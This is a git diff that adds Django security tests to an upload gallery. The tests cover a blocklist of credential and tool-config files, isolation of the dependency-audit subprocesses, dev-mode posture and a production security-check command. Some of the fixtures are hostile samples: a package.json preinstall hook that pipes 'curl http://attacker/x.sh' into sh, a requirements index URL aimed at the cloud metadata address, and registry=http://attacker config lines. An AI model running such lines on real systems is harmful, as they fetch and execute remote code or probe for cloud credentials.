@@ -7,7 +7,7 @@ from unittest import mock
 from django.contrib.auth.models import User
 from django.core.exceptions import ValidationError
 from django.core.files.uploadedfile import SimpleUploadedFile
-from django.test import TestCase, override_settings
+from django.test import SimpleTestCase, TestCase, override_settings
 from django.utils import timezone
 
 from gallery.access import user_can_download
@@ -3481,3 +3481,283 @@ class MarketingCopyTests(TestCase):
         # 500 ★ = R50 (the comment on MIN_PAYOUT_STARS) ⇒ 10 ★ = R1,
         # exactly the rate the value strip states.
         self.assertEqual(MIN_PAYOUT_STARS // 50, 10)
+
+
+@override_settings(RATELIMIT_ENABLE=False, MEDIA_ROOT='/tmp/blaqvibes-tests')
+class CredentialFileBlockTests(TestCase):
+    """Uploads may not carry the files that steer a tool or hold a key.
+
+    5 Whys: why test `.npmrc` specifically (and not just `.env`)? Because the
+    scan worker runs `npm audit`/`pip-audit`; an uploaded npmrc/pip.conf tells
+    those tools where to talk to. The blocklist is the cheap outer gate for the
+    thing `gallery/dep_audit.py` refuses to rely on inner gates for.
+    """
+
+    def test_upload_refuses_tool_config_and_private_keys(self):
+        for name in ('.npmrc', '.yarnrc', '.pypirc', '.netrc', '.gitconfig',
+                     '.git-credentials', 'id_rsa', 'id_ed25519'):
+            with self.subTest(name=name):
+                upload = make_zip_file({'app.py': 'print(1)\n', name: 'registry=http://attacker\n'})
+                with self.assertRaises(ValidationError) as ctx:
+                    validate_zip(upload)
+                self.assertIn(name, str(ctx.exception.messages))
+
+    def test_upload_refuses_them_inside_a_subfolder(self):
+        upload = make_zip_file({'pkg/.npmrc': 'registry=http://attacker\n'})
+        with self.assertRaises(ValidationError):
+            validate_zip(upload)
+
+    def test_env_example_is_still_allowed(self):
+        # The blocklist must not become so broad that a documented example file
+        # (which is how a project tells you WHICH secrets to set) gets rejected.
+        validate_zip(make_zip_file({'app.py': 'print(1)\n', '.env.example': 'API_KEY=\n'}))
+
+    def test_extract_gate_refuses_them_too(self):
+        """Second gate: validate_zip can be skipped by a code path; extraction may not."""
+        import shutil
+        import tempfile
+        from gallery.validators import safe_extract_zip
+        # `.npmrc` FIRST on purpose: extraction writes member by member, so an
+        # ordering that put the good file before the refusal would write it. The
+        # promise under test is 'the blocked file never reaches the disk'.
+        raw = make_zip_bytes({'.npmrc': 'registry=http://attacker\n', 'app.py': 'print(1)\n'})
+        tmp = tempfile.mkdtemp()
+        dest = os.path.join(tmp, 'out')
+        os.makedirs(dest)
+        zip_path = os.path.join(tmp, 'x.zip')
+        with open(zip_path, 'wb') as fh:
+            fh.write(raw)
+        try:
+            with self.assertRaises(ValueError):
+                safe_extract_zip(zip_path, dest)
+            self.assertFalse(os.path.exists(os.path.join(dest, '.npmrc')))
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
+
+@override_settings(RATELIMIT_ENABLE=False)
+class DependencyAuditIsolationTests(TestCase):
+    """The scanners must never get the attacker's manifest, flags, or cwd."""
+
+    def test_hostile_requirements_contribute_only_exact_pins(self):
+        import shutil
+        import tempfile
+        from gallery.dep_audit import safe_pip_pins
+        tmp = tempfile.mkdtemp()
+        try:
+            path = os.path.join(tmp, 'requirements.txt')
+            with open(path, 'w') as fh:
+                fh.write('\n'.join([
+                    'requests==2.31.0',
+                    '--index-url http://169.254.169.254/latest/meta-data/',
+                    '-i file:///tmp/evil',
+                    '-r other-requirements.txt',
+                    '-e .',
+                    'flask>=2.0',
+                    'numpy==1.26.4 ; python_version>="3.9"',
+                ]))
+            self.assertEqual(safe_pip_pins(path), ['requests==2.31.0', 'numpy==1.26.4'])
+            # A manifest made only of directives yields NO pins: the audit is then
+            # reported as not-run instead of silently 'clean'.
+            with open(path, 'w') as fh:
+                fh.write('--index-url http://attacker/simple\n-e .\n')
+            self.assertIsNone(safe_pip_pins(path))
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
+    def test_npm_scripts_and_non_registry_specs_never_reach_the_tool(self):
+        import json
+        import shutil
+        import tempfile
+        from gallery.dep_audit import safe_npm_deps
+        tmp = tempfile.mkdtemp()
+        try:
+            path = os.path.join(tmp, 'package.json')
+            with open(path, 'w') as fh:
+                json.dump({
+                    'scripts': {'preinstall': 'curl http://attacker/x.sh | sh'},
+                    'dependencies': {'left-pad': '1.3.0', 'evil': 'file:../evil',
+                                     'gitdep': 'git+https://attacker/repo'},
+                    'devDependencies': {'@scope/pkg': '2.0.0'},
+                }, fh)
+            self.assertEqual(safe_npm_deps(path), [('left-pad', '1.3.0'), ('@scope/pkg', '2.0.0')])
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
+    def test_audit_child_gets_our_cwd_our_manifest_and_no_secrets(self):
+        """The heart of the fix: what the tool is run WITH, not what it prints."""
+        import shutil
+        import tempfile
+        from gallery import dep_audit
+        root = tempfile.mkdtemp()
+        try:
+            with open(os.path.join(root, 'requirements.txt'), 'w') as fh:
+                fh.write('requests==2.31.0\n--index-url http://attacker/simple\n')
+            calls = []
+
+            def fake_run(cmd, **kwargs):
+                calls.append((list(cmd), kwargs))
+                raise FileNotFoundError('no pip-audit in this test environment')
+
+            with mock.patch.object(dep_audit.subprocess, 'run', side_effect=fake_run):
+                outcome = dep_audit.run_dep_audits(root)
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+        self.assertTrue(calls, 'expected the pip audit to be attempted')
+        for cmd, kwargs in calls:
+            cwd = os.path.realpath(kwargs['cwd'])
+            self.assertNotEqual(cwd, os.path.realpath(root), 'audit ran inside the upload')
+            self.assertFalse(cwd.startswith(os.path.realpath(root)), 'audit ran under the upload')
+            joined = ' '.join(str(part) for part in cmd)
+            self.assertNotIn(os.path.realpath(root), joined, 'the uploaded manifest was passed through')
+            self.assertIn('--disable-pip', cmd)
+            self.assertIn('--no-deps', cmd)
+            env = kwargs['env']
+            for secret in ('DATABASE_URL', 'REDIS_URL', 'AWS_SECRET_ACCESS_KEY',
+                           'PAYSTACK_SECRET_KEY', 'ANTHROPIC_API_KEY', 'SENTRY_DSN'):
+                self.assertNotIn(secret, env)
+            self.assertTrue(env['HOME'].startswith(cwd) or os.path.realpath(root) != env['HOME'])
+            # and the honesty contract: no tool means not-run, never 'audited'.
+            self.assertFalse(outcome['dep_audit']['ran'])
+
+    def test_npm_without_lockfile_is_not_audited(self):
+        import json
+        import shutil
+        import tempfile
+        from gallery.dep_audit import audit_npm
+        tmp = tempfile.mkdtemp()
+        try:
+            pkg = os.path.join(tmp, 'package.json')
+            with open(pkg, 'w') as fh:
+                json.dump({'dependencies': {'left-pad': '1.3.0'}}, fh)
+            self.assertEqual(audit_npm(pkg, None, tmp), ([], False, 'no_lockfile'))
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
+    def test_vendored_node_modules_is_not_the_projects_manifest(self):
+        import os as _os
+        import shutil
+        import tempfile
+        from gallery.dep_audit import find_manifests
+        root = tempfile.mkdtemp()
+        try:
+            vendored = _os.path.join(root, 'node_modules', 'dep')
+            _os.makedirs(vendored)
+            with open(_os.path.join(vendored, 'package.json'), 'w') as fh:
+                fh.write('{"dependencies":{"a":"1.0.0"}}')
+            self.assertEqual(find_manifests(root), (None, None, None))
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+
+
+class LocalDevPostureTests(SimpleTestCase):
+    """`LOCAL_DEV` is a decision, never a vibe check.
+
+    5 Whys: why spawn a subprocess to read a module? Because the behaviour under
+    test happens ONCE, at import time, from `os.environ`. Patching an already
+    imported settings module proves nothing about the inference we removed: an
+    activated virtualenv used to imply DEBUG, SSL-redirect off, the repository
+    SECRET_KEY acceptable and demo accounts seeded.
+    """
+
+    def _posture(self, **env):
+        import subprocess
+        import sys
+        child = dict(os.environ)
+        child.update({key: value for key, value in env.items() if value is not None})
+        for key, value in env.items():
+            if value is None:
+                child.pop(key, None)
+        # CI exports DJANGO_TEST=1 for the whole job. This test asks what a plain
+        # process decides, so the test-runner hint has to leave the environment —
+        # otherwise every case here would read as dev posture and prove nothing.
+        child.pop('DJANGO_TEST', None)
+        child.setdefault('SECRET_KEY', 'x' * 60)
+        code = 'import blaqvibes.settings as s; print(f"{int(s.LOCAL_DEV)}{int(s.DEBUG)}")'
+        result = subprocess.run([sys.executable, '-c', code], cwd=os.getcwd(), env=child,
+                                capture_output=True, text=True, timeout=60)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        return result.stdout.strip()
+
+    def test_an_activated_virtualenv_alone_is_not_dev_mode(self):
+        self.assertEqual(self._posture(VIRTUAL_ENV='/tmp/fake-venv', PYTHONENV='/tmp/fake-venv',
+                                       DEBUG=None, DJANGO_LOCAL_DEV=None), '00')
+
+    def test_debug_turns_dev_mode_on(self):
+        self.assertEqual(self._posture(DEBUG='1', VIRTUAL_ENV=None, DJANGO_LOCAL_DEV=None), '11')
+
+    def test_the_explicit_flag_beats_debug(self):
+        # `DJANGO_LOCAL_DEV=0` is an operator saying "this box faces the public
+        # internet" — the venv heuristic used to outrank exactly that.
+        self.assertEqual(self._posture(DEBUG='1', DJANGO_LOCAL_DEV='0'), '01')
+
+    def test_the_explicit_flag_turns_dev_mode_on_without_debug(self):
+        self.assertEqual(self._posture(DJANGO_LOCAL_DEV='1', DEBUG=None), '10')
+
+
+@override_settings(RATELIMIT_ENABLE=True)
+class SecurityCheckCommandTests(SimpleTestCase):
+    """The auditor itself: dev boxes never blocked, public hosts actually blocked."""
+
+    HARDENED = {
+        'DEBUG': False, 'LOCAL_DEV': False,
+        'SECRET_KEY': 'p' * 60,
+        'ALLOWED_HOSTS': ['blaqvibes.co.za'],
+        'CSRF_TRUSTED_ORIGINS': ['https://blaqvibes.co.za'],
+        'SECURE_SSL_REDIRECT': True, 'SECURE_HSTS_SECONDS': 31_536_000,
+        'SECURE_HSTS_INCLUDE_SUBDOMAINS': True, 'SECURE_CONTENT_TYPE_NOSNIFF': True,
+        'SECURE_REFERRER_POLICY': 'same-origin', 'SECURE_CROSS_ORIGIN_OPENER_POLICY': 'same-origin',
+        'X_FRAME_OPTIONS': 'DENY',
+        'SESSION_COOKIE_SECURE': True, 'CSRF_COOKIE_SECURE': True,
+        'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SAMESITE': 'Lax',
+        'SEED_DEMO': False, 'SOCIALACCOUNT_STORE_TOKENS': False,
+        'AWS_S3_CUSTOM_DOMAIN': '', 'AWS_DEFAULT_ACL': None, 'AWS_QUERYSTRING_AUTH': True,
+    }
+
+    def _run(self, *args, **overrides):
+        import io
+        from django.core.management import call_command
+        from django.test import override_settings as ov
+        values = dict(self.HARDENED)
+        values.update(overrides)
+        out = io.StringIO()
+        with ov(**values):
+            try:
+                call_command('security_check', *args, stdout=out)
+                failed = None
+            except SystemExit as exc:
+                failed = exc
+        return failed, out.getvalue()
+
+    def test_a_hardened_production_config_passes(self):
+        failed, output = self._run('--as-production')
+        self.assertIsNone(failed, output)
+        self.assertIn('no findings', output)
+
+    def test_production_posture_refuses_the_repository_dev_key(self):
+        failed, output = self._run('--as-production', SECRET_KEY='django-insecure-blaqvibes-dev-key-change-in-prod-07070A')
+        self.assertIsNotNone(failed, 'a deploy running the committed key must exit non-zero')
+        self.assertIn('SECRET_KEY', output)
+
+    def test_production_posture_refuses_a_wildcard_host_and_plaintext_origin(self):
+        failed, output = self._run('--as-production', ALLOWED_HOSTS=['*'],
+                                   CSRF_TRUSTED_ORIGINS=['http://blaqvibes.co.za'])
+        self.assertIsNotNone(failed)
+        self.assertIn("ALLOWED_HOSTS contains '*'", output)
+        self.assertIn('plaintext origin', output)
+
+    def test_seed_flags_are_refused_in_production_posture(self):
+        failed, output = self._run('--as-production', SEED_DEMO=True)
+        self.assertIsNotNone(failed, output)
+        self.assertIn('SEED_DEMO', output)
+
+    def test_dev_posture_warns_but_never_blocks(self):
+        # A dev box carries the dev key and no HSTS by design; the command must
+        # say so out loud (so a green run is not mistaken for a hardened deploy)
+        # while still exiting 0.
+        failed, output = self._run(DEBUG=True, LOCAL_DEV=True, SECURE_SSL_REDIRECT=False,
+                                   SECURE_HSTS_SECONDS=0, X_FRAME_OPTIONS='SAMEORIGIN',
+                                   SESSION_COOKIE_SECURE=False, CSRF_COOKIE_SECURE=False,
+                                   SECRET_KEY='django-insecure-blaqvibes-dev-key-change-in-prod-07070A')
+        self.assertIsNone(failed, output)
+        self.assertIn('dev posture', output)
